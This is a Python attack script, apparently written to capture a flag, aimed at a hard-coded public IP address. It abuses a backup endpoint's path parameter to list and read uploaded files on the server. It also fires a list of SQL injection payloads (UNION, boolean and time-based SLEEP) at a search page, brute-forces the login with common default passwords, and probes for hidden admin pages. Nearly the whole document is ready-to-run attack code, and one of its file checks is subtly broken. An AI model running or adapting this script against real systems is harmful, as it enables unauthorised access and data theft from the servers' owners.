import requests
import re
import os

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("检查上传目录中的所有文件内容")
print("="*70)

# 获取上传目录列表
r = session.get(f"{TARGET}/backup", params={"path": "F:\\small peoject\\python-lab\\uploads"}, timeout=15)
if r.status_code == 200:
    body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
    if body:
        files = body.group(1).strip().split('\n')
        print(f"文件列表:\n{files}")
        
        # 检查每个文件的内容
        for filename in files:
            if filename and filename.strip() and filename != '.gitkeep':
                filename = filename.strip()
                try:
                    print(f"\n>>> 检查文件: {filename}")
                    
                    # 尝试直接访问
                    r2 = session.get(f"{TARGET}/uploads/{filename}", timeout=15)
                    if r2.status_code == 200:
                        # 获取文件内容
                        content = r2.content
                        
                        # 尝试解码为文本
                        try:
                            text_content = content.decode('utf-8', errors='replace')
                            print(f"文件内容(文本): {text_content[:500]}")
                            
                            # 搜索flag
                            flag_match = re.search(r'flag\{[^}]+\}', text_content, re.IGNORECASE)
                            if flag_match:
                                print(f"\n🚩🚩🚩 FLAG FOUND IN {filename}: {flag_match.group(0)} 🚩🚩🚩")
                                exit(0)
                        except:
                            pass
                        
                        # 显示十六进制内容（前100字节）
                        hex_content = content[:100].hex()
                        print(f"文件十六进制内容: {hex_content}")
                        
                        # 检查是否包含PHP代码
                        if "<?php" in content.lower() or "<?=" in content.lower():
                            print(f"⚠️ 文件包含PHP代码")
                            print(f"PHP代码位置: {content.find('<?php') if '<?php' in content.lower() else content.find('<?')}")
                        
                        # 检查是否包含Python代码
                        if "import os" in content or "exec(" in content.lower():
                            print(f"⚠️ 文件包含Python代码")
                        
                        # 检查Content-Type
                        print(f"响应Content-Type: {r2.headers.get('Content-Type', '')}")
                except Exception as e:
                    print(f"错误: {e}")

print("\n" + "="*70)
print("深度测试SQL注入")
print("="*70)

# 尝试更多SQL注入payload
sql_payloads = [
    "' OR 1=1--",
    "' OR '1'='1",
    "' OR ''='",
    "1' OR 1=1--",
    "admin'--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' AND 1=1--",
    "' AND 1=2--",
    "') OR ('1'='1",
    "' OR 1=1 LIMIT 1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "1 OR 1=1",
    "' OR 1=1 ORDER BY 1--",
    "' OR 1=1 GROUP BY 1--",
    "' OR 1=1 HAVING 1=1--",
    "' OR EXISTS(SELECT * FROM users)--",
    "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
]

for payload in sql_payloads:
    try:
        r = session.get(f"{TARGET}/search", params={"q": payload}, timeout=15)
        if r.status_code == 200:
            # 检查是否有结果
            results = re.findall(r'<article[^>]*>.*?<h2>(.*?)</h2>', r.text, re.DOTALL)
            
            # 如果结果比正常搜索多，或者有异常结果
            if len(results) > 3:
                print(f"\n>>> SQL Payload: {payload}")
                print(f"结果数: {len(results)}")
                
                for i, result in enumerate(results[:10]):
                    print(f"  结果{i+1}: {result.strip()}")
                
                # 检查flag
                flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
                if flag_match:
                    print(f"\n🚩🚩🚩 FLAG FOUND IN SQL: {flag_match.group(0)} 🚩🚩🚩")
                    exit(0)
            
            # 检查是否有错误信息泄露
            if "error" in r.text.lower() or "sql" in r.text.lower():
                print(f"\n>>> SQL错误信息: {payload}")
                print(f"内容: {r.text[:300]}")
    except:
        pass

print("\n" + "="*70)
print("尝试登录后查看控制台")
print("="*70)

# 获取CSRF
r = session.get(f"{TARGET}/login", timeout=15)
csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
csrf_token = csrf.group(1) if csrf else ""

# 尝试更多凭据
credentials = [
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "root"),
    ("admin", "test"),
    ("admin", "ctf"),
    ("admin", "flag"),
    ("admin", "secret"),
    ("root", "root"),
    ("root", "admin"),
    ("root", "password"),
    ("test", "test"),
    ("user", "user"),
    ("user", "password"),
    ("guest", "guest"),
    ("demo", "demo"),
    ("administrator", "administrator"),
]

for username, password in credentials:
    try:
        data = {"username": username, "password": password, "csrf": csrf_token}
        r = session.post(f"{TARGET}/login", data=data, timeout=15)
        
        # 检查是否登录成功
        if "用户名或密码错误" not in r.text:
            # 检查是否有重定向
            if r.history or "登录" not in r.text[:100]:
                print(f"\n>>> 可能登录成功: {username}/{password}")
                print(f"响应状态码: {r.status_code}")
                print(f"Cookies: {session.cookies.get_dict()}")
                print(f"响应内容: {r.text[:500]}")
                
                # 尝试访问控制台
                r2 = session.get(f"{TARGET}/dashboard", timeout=15)
                print(f"\n控制台内容:")
                print(f"状态码: {r2.status_code}")
                print(f"内容: {r2.text[:800]}")
                
                # 检查flag
                flag_match = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
                if flag_match:
                    print(f"\n🚩🚩🚩 FLAG FOUND IN DASHBOARD: {flag_match.group(0)} 🚩🚩🚩")
                    exit(0)
                
                # 检查是否有其他隐藏信息
                hidden_inputs = re.findall(r'<input[^>]*hidden[^>]*value=["\']([^"\']+)["\']', r2.text)
                if hidden_inputs:
                    print(f"隐藏字段: {hidden_inputs}")
    except:
        pass

print("\n" + "="*70)
print("尝试访问其他隐藏页面")
print("="*70)

hidden_pages = [
    "/admin",
    "/config",
    "/settings",
    "/debug",
    "/test",
    "/dev",
    "/api",
    "/v1",
    "/v2",
    "/internal",
    "/secret",
    "/flag",
    "/hidden",
    "/private",
    "/root",
    "/superadmin",
    "/god",
    "/master",
    "/owner",
    "/manager",
]

for page in hidden_pages:
    try:
        r = session.get(f"{TARGET}{page}", timeout=10)
        if r.status_code == 200 and len(r.text) > 100:
            print(f"\n>>> {page}")
            print(f"状态码: {r.status_code}")
            print(f"内容: {r.text[:300]}")
            
            flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND IN {page}: {flag_match.group(0)} 🚩🚩🚩")
                exit(0)
    except:
        pass

print("\n测试完成")